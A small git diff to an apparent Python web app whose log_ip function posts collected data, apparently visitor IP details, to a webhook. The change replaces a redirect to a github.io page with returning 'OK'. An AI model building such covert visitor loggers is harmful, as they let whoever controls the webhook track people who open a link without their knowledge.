@@ -15,7 +15,7 @@ def log_ip():
     }
     requests.post(WEBHOOK_URL, json=data)
     time.sleep(5)
-    return redirect("https://gengaog.github.io/-/")  # oder return "OK"
+    return "OK"
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
